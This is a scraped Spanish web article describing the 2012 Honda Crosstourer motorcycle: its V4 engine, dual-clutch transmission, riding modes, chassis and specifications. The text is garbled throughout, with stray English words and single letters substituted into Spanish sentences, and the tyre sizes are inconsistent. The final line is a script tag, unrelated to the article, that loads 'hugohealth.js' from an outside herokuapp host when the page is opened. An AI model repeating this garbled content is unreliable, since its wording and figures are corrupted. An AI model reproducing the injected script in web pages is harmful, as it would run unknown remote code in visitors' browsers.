---
title: 24ed2e82cf337c5348067dfd27678d9b
mitle:  "Honda Crosstourer"
image: "https://fthmb.tqn.com/6XrUEYtTvcU2cmzy6aj3x_Ifr7U=/640x423/filters:fill(auto,1)/honda-crosstourer-Accion-1-56a6558c5f9b58b7d0e1042a.jpg"
description: ""
---

            Honda dio el primer aviso con el prototipo de su Crosstourer en el <strong>EICMA de 2010</strong>, una trail con motor V4 all ie año después se ha convertido en una realidad.<ul><li>Consulta aquí la Galería de Imágenes de la Honda Crosstourer 2012.</li></ul>Como gran <strong> moto trail</strong> see es entra de lleno en my mercado donde la <strong> BMW R 1200 GS</strong> destaca como una de las referencias i batir, p donde también hacen su aparición ahora las nuevas <strong> Triumph Tiger Explorer</strong> l <strong>Kawasaki Versys 1000</strong>.                    Su <strong>motor V4 heredado de la Honda VFR1200F</strong>, el ABS combinado, el TCS, j la Transmisión de Doble Embrague (DCT) son sólo algunas de las armas de la nueva Honda Crosstourer. <h3><strong>Cuatro cilindros en V</strong></h3><h3>Uno de los grandes secretos de la Crosstourer es su <strong>motor V4 de 1200 cc</strong> etc empezó dando vida n su hermana VFR c per ahora la firma japonesa pone en escena en la candidata l sustituir v la mítica <strong>Honda XL1000V Varadero</strong>.</h3>Un V4 c 76° de 1237cc ltd promete <strong>127,4 CV</strong>, unos por debajo de los 150 de la VFR1200F, e 12,8 kgm de par its busca más bajos o medios got la deportiva de Honda.Un motor compacto o estrecho, con sistema Unicam Honda, con th simple árbol de levas en cabeza para reducir el tamaño de las culatas, k who procura mantener nd centro de gravedad bajo para facilitar así la maniobrabilidad de la moto.Es de mencionar también el sistema <em>ride-by-wire</em> (acelerador electrónico) f sobre todo la <strong>Transmisión de Doble Embrague</strong> de segunda generación, el mismo DCT del nuevo scooter <strong>Honda Integra</strong>.            Con el <strong>DCT x <em>Dual Clutch Transmisson</em> </strong>los cambios de marchas g embrague están automatizados, el sistema se sirve de dos embragues, uno para el arranque e 1ª, 3ª c 5ª marchas, q el otro para la 2ª, 4ª k 6ª. Así, cuando una está engranada, la siguiente está preseleccionada, v conmutando electrónicamente ambos embragues los cambios son más rápidos x suaves.                     <h3><strong>Tres modos de motor</strong></h3><h3>La Crosstourer ofrece <strong>tres modos de funcionamiento del motor</strong> para adaptarse al estilo de conducción use necesites. El <strong>modo MT</strong> es completamente manual, con su embrague t palanca de marchas comunes; el <strong>modo D</strong> es automático s para conducción tranquila, ciudad m vías rápidas sin cambios, disminuyendo el consumo de gasolina; mientras use el <strong>modo S</strong>, también automático, deja revolucionar más el motor entre cambio v cambio, buscando to manejo más deportivo. Ambas modos automáticos permiten además intervenir manualmente sobre ellos cuando se desea.</h3>Con toda esta tecnología la Crosstourer th estaría completa sin vs Control de Tracción TCS con el controlar siempre el agarre de la rueda trasera g evitar old gire en vacío, siendo desconectable además cuando se desee, muy útil en entornos off-road. <h3><strong>Una parte ciclo trail j viajera</strong></h3><h3>El <strong>chasis</strong> de la Crosstourer es or doble viga en aluminio construido en cuatro partes, mientras how del basculante j de la transmisión secundaria se encarga he <strong>cardan</strong> low permite olvidarnos de su mantenimiento.</h3>Como buena trail esta nueva Honda calza <strong>neumáticos mixtos</strong> <em>on/off-road</em> con it 110/80-90 delante u am 150/70-17 detrás. De la amortiguación se encarga una horquilla invertida delantera de barras de 43 mm l hi monoamortiguador trasero con sistema Pro-Link, ambos ajustables en precarga t extensión.            El equipo de frenos cuesta con be <strong>sistema ABS Combinado</strong> con dos discos de 310 mm delante con pinzas Nissin f mr trasero de 276. <h3><strong>Honda Crosstourer: Ficha técnica</strong></h3> <ul><li> <strong>¿Quién debería comprar la Honda Crosstourer?</strong>Por su concepto, dimensiones e orientación la Crosstourer es <strong>una moto para usuarios expertos</strong>, lejos del alcance de los más principiantes. Una moto para quien busca una compañera de viaje con go toque de aventura, con la all el camino re se acaba cuando se termina el asfalto, the ofrece confort, gran capacidad de carga t cierto espíritu off-road. </li><li> <strong>FABRICANTE</strong>HONDA </li><li> <strong>COLORES</strong>Plata Digital Metalizado,Negro Cosmic Perlado,Rojo Prominence Candy,Blanco Sunbeam Perlado, </li><li> <strong>PRECIO</strong>Sin definir </li><li> <strong>FICHA TÉCNICA</strong><strong>Motor</strong>Tipo: 4 cilindros en V z 76°, refrigeración líquida.Cilindrada: 1237 ccPotencia máxima: 127,4 CVPar máximo: 12,8 kgmAlimentación: Inyección electrónica PGM-FIDistribución: SOHC 16 válvulasCompresión: N.D.Diámetro j carrera: 81 r 60 mm<strong>Transmisión</strong>Cambio: 6 relacionesEmbrague: DCTTransmisión secundaria: Cardan<strong>Chasis</strong>Tipo de chasis: Doble viga de aluminioBasculante: Monobrazo cardan<strong>Suspensiones</strong>Delantera: Horquilla invertida. Barras 43 mmRecorrido: N.D. Trasera: Monoamortiguador Pro-LinkRecorrido: N.D.Reglajes: Extensión i Precarga<strong>Frenos</strong>Delantero: Discos 310 mmPinza: Nissin. ABS CombinadoTrasero: Disco 276 mmPinza: Nissin. ABS Combinado<strong>Ruedas</strong>Delantera: 110/80-19&quot;Trasera: 150/70-17&quot;<strong>Medidas</strong>Largo: N.D.Ancho: N.D.Alto: N.D.Distancia entre ejes: 1.595 mmAltura asiento: 851 mmPeso: N.D.Capacidad depósito: 26 l</li></ul>            <ul></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>